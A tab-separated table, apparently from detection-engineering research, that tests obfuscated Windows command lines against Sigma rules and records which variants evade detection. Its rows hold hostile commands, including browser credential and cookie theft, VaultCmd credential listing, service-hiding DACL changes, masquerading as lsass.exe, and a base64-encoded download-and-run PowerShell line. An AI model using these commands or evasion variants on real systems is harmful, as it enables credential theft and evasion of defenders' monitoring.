Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218.010	proc_creation_win_regsvr32_susp_extensions	Regsvr32 DLL Execution With Suspicious File Extension	089fc3d2-71e8-4763-a8a5-c97fbb0a403e		"C:\Windows\system32\regsvr32.exe  /s ""C:\Users\thaim\AppData\Local\Temp\shell32.jpg"""	TRUE	TRUE	FALSE	Regsvr32 Execution From Potential Suspicious Location (9525dc73-0327-438c-8c04-13c0e037e9da); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22); Regsvr32 DLL Execution With Uncommon Extension (50919691-7302-437f-8e10-1fe088afa145)
t1218.010	proc_creation_win_regsvr32_susp_extensions	Regsvr32 DLL Execution With Suspicious File Extension	089fc3d2-71e8-4763-a8a5-c97fbb0a403e		C:\Windows\system32\regsvr32.exe  /s C:\Users\thaim\AppData\Local\Temp\shell32.jpg::$DATA	TRUE	TRUE	FALSE	Regsvr32 Execution From Potential Suspicious Location (9525dc73-0327-438c-8c04-13c0e037e9da); Scripting/CommandLine Process Spawned Regsvr32 (ab37a6ec-6068-432b-a64e-2c7bf95b1d22); Regsvr32 DLL Execution With Uncommon Extension (50919691-7302-437f-8e10-1fe088afa145)
t1124	proc_creation_win_remote_time_discovery	Discovery of a System Time	b243b280-65fe-48df-ba07-6ddea7646427		"cmd.exe /c ""net.exe ti^me \\localhost"""	FALSE	FALSE	FALSE	
t1124	proc_creation_win_remote_time_discovery	Discovery of a System Time	b243b280-65fe-48df-ba07-6ddea7646427		"net.exe ""ti""""me"" \\localhost"	TRUE	TRUE	FALSE	Windows Share Mount Via Net.EXE (f117933c-980c-4f78-b384-e3d838111165); Windows Share Mount Via Net.EXE (f117933c-980c-4f78-b384-e3d838111165)
t1124	proc_creation_win_remote_time_discovery	Discovery of a System Time	b243b280-65fe-48df-ba07-6ddea7646427		"w32tm /t""""z"	TRUE	TRUE	TRUE	
t1124	proc_creation_win_remote_time_discovery	Discovery of a System Time	b243b280-65fe-48df-ba07-6ddea7646427		"cmd.exe /c ""w32tm /t^z"""	FALSE	FALSE	FALSE	
t1124	proc_creation_win_w32tm	Use of W32tm as Timer	6da2c9f5-7c53-401b-aacb-92c040ce1215		W32tm  -stripchart -computer:localhost -period:5 -dataonly -samples:2	TRUE	TRUE	TRUE	
t1124	proc_creation_win_w32tm	Use of W32tm as Timer	6da2c9f5-7c53-401b-aacb-92c040ce1215	"W32tm   \""/stripchart\"" \""/computer:localhost\"" \""/period:5\"" \""/dataonly\"" \""/samples:2\"""	"W32tm  ""/stripchart"" ""/computer:localhost"" ""/period:5"" ""/dataonly"" ""/samples:2"""	TRUE	FALSE	FALSE	Use of W32tm as Timer (6da2c9f5-7c53-401b-aacb-92c040ce1215)
t1124	proc_creation_win_w32tm	Use of W32tm as Timer	6da2c9f5-7c53-401b-aacb-92c040ce1215		"cmd.exe /c ""w32tm /str^ipchart /computer:localhost /per^iod:5 /data^only /sam^ples:2"""	FALSE	FALSE	FALSE	
t1555.004	proc_creation_win_rundll32_keymgr	Suspicious Key Manager Access	a4694263-59a8-4608-a3a0-6f8d3a51664c		"""C:\WINDOWS\system32\rundll32.exe"" keymgr,KRShowKey""""Mgr"	FALSE	FALSE	FALSE	
t1555.004	proc_creation_win_rundll32_keymgr	Suspicious Key Manager Access	a4694263-59a8-4608-a3a0-6f8d3a51664c		"cmd.exe /c """"C:\WINDOWS\system32\rundll32.exe"" keymgr,KRS^howKeyMgr"""	FALSE	FALSE	FALSE	
t1555.004	proc_creation_win_rundll32_keymgr	Suspicious Key Manager Access	a4694263-59a8-4608-a3a0-6f8d3a51664c		"""C:\WINDOWS\system32\rundll32.exe"" keymgr,#1"	FALSE	FALSE	FALSE	
t1555.004	proc_creation_win_vaultcmd_list_creds	Windows Credential Manager Access via VaultCmd	58f50261-c53b-4c88-bd12-1d71f12eda4c		"""C:\WINDOWS\system32\VaultCmd.exe"" -listcreds:""Web Credentials"" /all"	FALSE	FALSE	FALSE	
t1555.004	proc_creation_win_vaultcmd_list_creds	Windows Credential Manager Access via VaultCmd	58f50261-c53b-4c88-bd12-1d71f12eda4c		"""C:\WINDOWS\system32\VaultCmd.exe"" ""/list""creds:""Windows Credentials"" /all"	FALSE	FALSE	FALSE	
t1555.004	proc_creation_win_vaultcmd_list_creds	Windows Credential Manager Access via VaultCmd	58f50261-c53b-4c88-bd12-1d71f12eda4c		"cmd.exe /c """"C:\WINDOWS\system32\VaultCmd.exe"" /lis^tcreds:""Web Credentials"" /all"""	TRUE	TRUE	TRUE	
t1546.015	proc_creation_win_rundll32_registered_com_objects	Rundll32 Registered COM Objects	f1edd233-30b5-4823-9e6a-c4171b24d316		"""C:\Windows\System32\rundll32.exe"" /localserver {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"	FALSE	FALSE	FALSE	
t1546.015	proc_creation_win_rundll32_registered_com_objects	Rundll32 Registered COM Objects	f1edd233-30b5-4823-9e6a-c4171b24d316		"""C:\Windows\System32\rundll32.exe"" ""-sta ""{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"	FALSE	FALSE	FALSE	
t1546.015	proc_creation_win_rundll32_registered_com_objects	Rundll32 Registered COM Objects	f1edd233-30b5-4823-9e6a-c4171b24d316		"cmd.exe /c ""C:\Windows\System32\rundll32.exe"" -st^a {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"	FALSE	FALSE	FALSE	
t1574.011	proc_creation_win_sc_sdset_hide_sevices	Service DACL Abuse To Hide Services Via Sc.EXE	a537cfc3-4297-4789-92b5-345bfd845ad0	"sc.exe  sdset AtomicService \""D:(D;;LCCWDCWPCCSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"""	"sc.exe sdset AtomicService ""D:(D;;LCCWDCWPCCSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"""	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011	proc_creation_win_sc_sdset_hide_sevices	Service DACL Abuse To Hide Services Via Sc.EXE	a537cfc3-4297-4789-92b5-345bfd845ad0	"sc.exe  sdset AtomicService \""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"""	"cmd.exe /c sc.exe s^d^s^e^t AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"""	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011	proc_creation_win_sc_sdset_hide_sevices	Service DACL Abuse To Hide Services Via Sc.EXE	a537cfc3-4297-4789-92b5-345bfd845ad0	"sc.exe  \""sdset\"" AtomicService \""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"""	"sc.exe ""sdset"" AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"""	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011	proc_creation_win_sc_sdset_modification	Service Security Descriptor Tampering Via Sc.EXE	98c5aeef-32d5-492f-b174-64a691896d25	"sc.exe  sdset AtomicService \""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"""	"cmd.exe /c sc.exe s^d^s^e^t AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"""	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service DACL Abuse To Hide Services Via Sc.EXE (a537cfc3-4297-4789-92b5-345bfd845ad0); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1574.011	proc_creation_win_sc_sdset_modification	Service Security Descriptor Tampering Via Sc.EXE	98c5aeef-32d5-492f-b174-64a691896d25	"sc.exe  \""sdset\"" scmanager D:(A;;KA;;;WD)"	"sc.exe ""sdset"" scmanager D:(A;;KA;;;WD)"	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1053.005	proc_creation_win_schtasks_creation	Scheduled Task Creation Via Schtasks.EXE	92626ddd-662c-49e3-ac59-f6535f12d189		"schtasks.exe -create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"""	TRUE	TRUE	FALSE	Suspicious Schtasks Schedule Types (24c8392b-aa3c-46b7-a545-43f71657fe98)
t1053.005	proc_creation_win_schtasks_creation	Scheduled Task Creation Via Schtasks.EXE	92626ddd-662c-49e3-ac59-f6535f12d189		"schtasks.exe ""/create"" /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"""	TRUE	TRUE	FALSE	Suspicious Schtasks Schedule Types (24c8392b-aa3c-46b7-a545-43f71657fe98)
t1053.005	proc_creation_win_schtasks_creation	Scheduled Task Creation Via Schtasks.EXE	92626ddd-662c-49e3-ac59-f6535f12d189	"schtasks.exe  /create /tn \""T1053_005_OnLogon\"" /sc onlogon /tr \""cmd.exe /c calc.exe\"""	"cmd.exe /c schtasks.exe /cr^eate /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"""	TRUE	FALSE	FALSE	Suspicious Schtasks Schedule Types (24c8392b-aa3c-46b7-a545-43f71657fe98); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1053.005	proc_creation_win_schtasks_schedule_type	Suspicious Schtasks Schedule Types	24c8392b-aa3c-46b7-a545-43f71657fe98		"schtasks.exe /create /tn ""T1053_005_OnLogon"" /sc ""onlogon"" /tr ""cmd.exe /c calc.exe"""	TRUE	TRUE	FALSE	Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1053.005	proc_creation_win_schtasks_schedule_type	Suspicious Schtasks Schedule Types	24c8392b-aa3c-46b7-a545-43f71657fe98	"schtasks.exe  /create /tn \""T1053_005_OnLogon\"" /sc onlogon /tr \""cmd.exe /c calc.exe\"""	"cmd.exe /c schtasks.exe /create /tn ""T1053_005_OnLogon"" /sc on^lo^gon /tr ""cmd.exe /c calc.exe"""	TRUE	FALSE	FALSE	Suspicious Schtasks Schedule Types (24c8392b-aa3c-46b7-a545-43f71657fe98); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
t1053.005	proc_creation_win_schtasks_schedule_type	Suspicious Schtasks Schedule Types	24c8392b-aa3c-46b7-a545-43f71657fe98		"schtasks.exe -create -tn ""T1053_005_OnLogon"" -sc ""ONCE"" -tr ""cmd.exe /c calc.exe"" -st 20:10"	TRUE	TRUE	TRUE	
t1546.011	proc_creation_win_sdbinst_shim_persistence	Potential Shim Database Persistence via Sdbinst.EXE	517490a7-115a-48c6-8862-1a481504d5a8		"sdbinst.exe ""C:\AtomicRedTeam\atomics\T1546.011\bin\AtomicShimx86.sd""""b"""	TRUE	TRUE	FALSE	Uncommon Extension Shim Database Installation Via Sdbinst.EXE (18ee686c-38a3-4f65-9f44-48a077141f42)
t1546.011	proc_creation_win_sdbinst_shim_persistence	Potential Shim Database Persistence via Sdbinst.EXE	517490a7-115a-48c6-8862-1a481504d5a8	"sdbinst.exe  \""\\?\C:\AtomicRedTeam\atomics\T1546.011\bin\AtomicShimx86.sdb \"""	"sdbinst.exe ""\\?\C:\AtomicRedTeam\atomics\T1546.011\bin\AtomicShimx86.sdb """	TRUE	FALSE	FALSE	Potential Shim Database Persistence via Sdbinst.EXE (517490a7-115a-48c6-8862-1a481504d5a8)
t1546.011	proc_creation_win_sdbinst_shim_persistence	Potential Shim Database Persistence via Sdbinst.EXE	517490a7-115a-48c6-8862-1a481504d5a8		"cmd.exe /c sdbinst.exe ""C:\AtomicRedTeam\atomics\T1546.011\bin\AtomicShimx86.sd^b"""	TRUE	TRUE	FALSE	Uncommon Extension Shim Database Installation Via Sdbinst.EXE (18ee686c-38a3-4f65-9f44-48a077141f42)
t1562.002	proc_creation_win_secedit_execution	Potential Suspicious Activity Using SeCEdit	c2c76b77-32be-4d1f-82c9-7e544bdfe0eb		secedit.exe -export /areas SECURITYPOLICY -cfg output_mysecpol.txt	TRUE	TRUE	TRUE	
t1562.002	proc_creation_win_secedit_execution	Potential Suspicious Activity Using SeCEdit	c2c76b77-32be-4d1f-82c9-7e544bdfe0eb	"secedit.exe  \""/configure\"" /db mytemplate.db"	"secedit.exe ""/configure"" /db mytemplate.db"	TRUE	FALSE	FALSE	Potential Suspicious Activity Using SeCEdit (c2c76b77-32be-4d1f-82c9-7e544bdfe0eb)
t1562.002	proc_creation_win_secedit_execution	Potential Suspicious Activity Using SeCEdit	c2c76b77-32be-4d1f-82c9-7e544bdfe0eb	secedit.exe  /export /areas SECURITYPOLICY /cfg output_mysecpol.txt	cmd.exe /c secedit.exe /exp^ort /areas SECURITYPOLICY /cfg output_mysecpol.txt	TRUE	FALSE	FALSE	Potential Suspicious Activity Using SeCEdit (c2c76b77-32be-4d1f-82c9-7e544bdfe0eb)
t1558.003	proc_creation_win_setspn_spn_enumeration	Potential SPN Enumeration Via Setspn.EXE	1eeed653-dbc8-4187-ad0c-eeebb20e6599	setspn.exe  -T %%USERDNSDOMAIN%% -Q */*	setspn.exe -T %USERDNSDOMAIN% -Q */*	TRUE	FALSE	FALSE	Potential SPN Enumeration Via Setspn.EXE (1eeed653-dbc8-4187-ad0c-eeebb20e6599)
t1558.003	proc_creation_win_setspn_spn_enumeration	Potential SPN Enumeration Via Setspn.EXE	1eeed653-dbc8-4187-ad0c-eeebb20e6599		"setspn.exe -T %USERDNSDOMAIN% ""-q"" */*"	TRUE	TRUE	TRUE	
t1558.003	proc_creation_win_setspn_spn_enumeration	Potential SPN Enumeration Via Setspn.EXE	1eeed653-dbc8-4187-ad0c-eeebb20e6599	setspn.exe  -T %%USERDNSDOMAIN%% -q */*	cmd.exe /c setspn.exe -T %USERDNSDOMAIN% -^q */*	TRUE	FALSE	FALSE	Potential SPN Enumeration Via Setspn.EXE (1eeed653-dbc8-4187-ad0c-eeebb20e6599)
t1539	proc_creation_win_sqlite_chromium_profile_data	SQLite Chromium Profile Data DB Access	24c77512-782b-448a-8950-eddb0785fc71		"C:\ExternalPayloads\sqlite3.exe ""C:\Users\thaim\AppData\Local\Google\Chrome\User Data/Default/Network/Cookies"""	TRUE	TRUE	TRUE	
t1539	proc_creation_win_sqlite_chromium_profile_data	SQLite Chromium Profile Data DB Access	24c77512-782b-448a-8950-eddb0785fc71		"cmd.exe /c C:\ExternalPayloads\sqlite3.exe ""C:\Users\thaim\AppData\Local\Google\Chrome\User Data\Default\Network\Cook^ies"""	TRUE	TRUE	TRUE	
t1539	proc_creation_win_sqlite_chromium_profile_data	SQLite Chromium Profile Data DB Access	24c77512-782b-448a-8950-eddb0785fc71		"C:\ExternalPayloads\sqlite3.exe ""C:\Users\thaim\AppData\Local\Google\Chrome\User Data\Default\Network\Cook""""ies"""	TRUE	TRUE	TRUE	
t1548	proc_creation_win_susp_abusing_debug_privilege	Abused Debug Privilege by Arbitrary Parent Processes	d522eca2-2973-4391-a3e0-ef0374321dae		C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv & rem route ADD	TRUE	TRUE	FALSE	Privilege Escalation via Named Pipe Impersonation (9bd04a79-dabe-4f1f-a5ff-92430265c96b)
t1548	proc_creation_win_susp_abusing_debug_privilege	Abused Debug Privilege by Arbitrary Parent Processes	d522eca2-2973-4391-a3e0-ef0374321dae		"C:\WINDOWS\system32\cmd.exe /C start C:\WINDOWS\system32\cmd.exe /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC"" # route ADD"	TRUE	TRUE	FALSE	Privilege Escalation via Named Pipe Impersonation (9bd04a79-dabe-4f1f-a5ff-92430265c96b); Privilege Escalation via Named Pipe Impersonation (9bd04a79-dabe-4f1f-a5ff-92430265c96b); Privilege Escalation via Named Pipe Impersonation (9bd04a79-dabe-4f1f-a5ff-92430265c96b); Suspicious High IntegrityLevel Conhost Legacy Option (3037d961-21e9-4732-b27a-637bcc7bf539)
t1548	proc_creation_win_susp_abusing_debug_privilege	Abused Debug Privilege by Arbitrary Parent Processes	d522eca2-2973-4391-a3e0-ef0374321dae		"C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command ""New-Item -ItemType File C:\art-marker.txt; # route ADD """" frame"	FALSE	FALSE	FALSE	
t1555.003	proc_creation_win_susp_copy_browser_data	Potential Browser Data Stealing	47147b5b-9e17-4d76-b8d2-7bac24c5ce1b		"""powershell.exe"" & {gi ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" | % {copy $_.FullName -Destination ""C:\AtomicRedTeam\ExternalPayloads""}}"	FALSE	FALSE	FALSE	
t1555.003	proc_creation_win_susp_copy_browser_data	Potential Browser Data Stealing	47147b5b-9e17-4d76-b8d2-7bac24c5ce1b		"""powershell.exe"" & {Copy-Item -Path ""$env:LOCALAPPDATA/Google/Chrome/User Data/Default/Login Data"" -Destination ""C:\AtomicRedTeam\ExternalPayloads""}"	FALSE	FALSE	FALSE	
t1555.003	proc_creation_win_susp_copy_browser_data	Potential Browser Data Stealing	47147b5b-9e17-4d76-b8d2-7bac24c5ce1b		"""powershell.exe"" & {Set-Location ""$env:LOCALAPPDATA\Google\Chrome""; Copy-Item "".\User Data\Default\Login Data"" -Destination ""C:\AtomicRedTeam\ExternalPayloads""}"	FALSE	FALSE	FALSE	
t1036.003	proc_creation_win_susp_copy_system_dir	Suspicious Copy From or To System Directory	fff9d2b7-e11c-4a69-93d3-40ef66189767		"""cmd.exe"" /c c^o^p^y %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe"	FALSE	FALSE	FALSE	
t1036.003	proc_creation_win_susp_copy_system_dir	Suspicious Copy From or To System Directory	fff9d2b7-e11c-4a69-93d3-40ef66189767		"""powershell.exe"" & {gi $env:windir/System32/cmd.exe | % {copy $_.FullName -destination $env:allusersprofile\cmd.exe}}"	FALSE	FALSE	FALSE	
t1036.003	proc_creation_win_susp_copy_system_dir	Suspicious Copy From or To System Directory	fff9d2b7-e11c-4a69-93d3-40ef66189767		"""cmd.exe"" /c cd /d %SystemRoot%\System32 && copy cmd.exe %SystemRoot%\Temp\lsass.exe"	FALSE	FALSE	FALSE	
t1566.001	proc_creation_win_susp_double_extension	Suspicious Double Extension File Execution	1cdd9a09-06c9-4769-99ff-626e2b3991b8		"C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.pdf"".exe"""	FALSE	FALSE	FALSE	
t1566.001	proc_creation_win_susp_double_extension	Suspicious Double Extension File Execution	1cdd9a09-06c9-4769-99ff-626e2b3991b8		C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.pdf.lnk	FALSE	FALSE	FALSE	
t1566.001	proc_creation_win_susp_double_extension	Suspicious Double Extension File Execution	1cdd9a09-06c9-4769-99ff-626e2b3991b8		"""C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.pdf .exe"""	FALSE	FALSE	FALSE	
t1552	proc_creation_win_susp_eventlog_content_recon	Potentially Suspicious EventLog Recon Activity Using Log Query Utilities	beaa66d6-aa1b-4e3c-80f5-e0145369bfaf	"cmd.exe /c ""powershell -Command \""Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'; Id=21} | ForEach-Object { $eventXml = [xml]$_.ToXml(); $username = $eventXml.Event.UserData.EventXML.User; $ipAddress = $eventXml.Event.UserData.EventXML.Address; $loginTime = $_.TimeCreated; if ($username -and $ipAddress -and $loginTime) { Write-Output ('User: ' + $username + ' IP: ' + $ipAddress + ' Login Time: ' + $loginTime) }}\"""""	"powershell -Command ""Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'; Id=21} | ForEach-Object { $eventXml = [xml]$_.ToXml(); $username = $eventXml.Event.UserData.EventXML.User; $ipAddress = $eventXml.Event.UserData.EventXML.Address; $loginTime = $_.TimeCreated; if ($username -and $ipAddress -and $loginTime) { Write-Output ('User: ' + $username + ' IP: ' + $ipAddress + ' Login Time: ' + $loginTime) }}"""	TRUE	FALSE	FALSE	Potentially Suspicious EventLog Recon Activity Using Log Query Utilities (beaa66d6-aa1b-4e3c-80f5-e0145369bfaf); Potentially Suspicious EventLog Recon Activity Using Log Query Utilities (beaa66d6-aa1b-4e3c-80f5-e0145369bfaf); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1552	proc_creation_win_susp_eventlog_content_recon	Potentially Suspicious EventLog Recon Activity Using Log Query Utilities	beaa66d6-aa1b-4e3c-80f5-e0145369bfaf		"powershell -Command ""Invoke-Expression ('Get-' + 'WinEvent' + ' -LogName ""Microsoft-Windows-TerminalServices-LocalSessionManager/Operational""') | Where-Object {$_.Id -eq 21} | ForEach-Object { $eventXml = [xml]$_.ToXml(); $username = $eventXml.Event.UserData.EventXML.User; $ipAddress = $eventXml.Event.UserData.EventXML.Address; $loginTime = $_.TimeCreated; if ($username -and $ipAddress -and $loginTime) { Write-Output ('User: ' + $username + ' IP: ' + $ipAddress + ' Login Time: ' + $loginTime) }}"""	FALSE	FALSE	FALSE	
t1552	proc_creation_win_susp_eventlog_content_recon	Potentially Suspicious EventLog Recon Activity Using Log Query Utilities	beaa66d6-aa1b-4e3c-80f5-e0145369bfaf		"powershell -Command ""[System.Diagnostics.Eventing.Reader.EventLogReader]::new((New-Object System.Diagnostics.Eventing.Reader.EventLogQuery('Microsoft-Windows-TerminalServices-LocalSessionManager/Operational', [System.Diagnostics.Eventing.Reader.PathType]::LogName))).ReadEvent()"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1106	proc_creation_win_susp_inline_win_api_access	Potential WinAPI Calls Via CommandLine	ba3f5c1b-6272-4119-9dbd-0bc8d21c2702	"cmd.exe /c ""cmd.exe /c copy C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateRemoteThread.exe %%temp%%\crt.exe && %%temp%%\crt.exe -pid 11728 -debug"""	cmd.exe /c copy C:\AtomicRedTeam\atomics\T1055\bin\x64\CreateRemoteThread.exe %temp%\crt.exe && %temp%\crt.exe -pid 11728 -debug	TRUE	FALSE	FALSE	Potential WinAPI Calls Via CommandLine (ba3f5c1b-6272-4119-9dbd-0bc8d21c2702); Potential WinAPI Calls Via CommandLine (ba3f5c1b-6272-4119-9dbd-0bc8d21c2702)
t1106	proc_creation_win_susp_inline_win_api_access	Potential WinAPI Calls Via CommandLine	ba3f5c1b-6272-4119-9dbd-0bc8d21c2702		"""powershell.exe"" & { $p = Start-Process C:\Windows\System32\werfault.exe -passthru; & ""C:\AtomicRedTeam\atomics\T1055\bin\x64\Create""""Remote""""Thread.exe"" -pid $p.Id -debug }"	FALSE	FALSE	FALSE	
t1106	proc_creation_win_susp_inline_win_api_access	Potential WinAPI Calls Via CommandLine	ba3f5c1b-6272-4119-9dbd-0bc8d21c2702		"""powershell.exe"" & {$h = [System.Convert]::FromBase64String('aGVsbG8='); iex(New-Object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1MzY3VyM1RoMXNTaDF0L0dldC1TeXN0ZW0tVGVjaG5pcXVlcy9tYXN0ZXIvVXNvRExML0dldC1Vc29DbGllbnRETExTeXN0ZW0uYHMx')))}"	FALSE	FALSE	FALSE	
t1036.002	proc_creation_win_susp_right_to_left_override	Potential Defense Evasion Via Right-to-Left Override	ad691d92-15f2-4181-9aa4-723c74f9ddc3		"powershell.exe -Command ""$rtlo = [char]0x202E; & \""C:\Users\thaim\Desktop\evil_batch${rtlo}fdp.bat\"""""	FALSE	FALSE	FALSE	
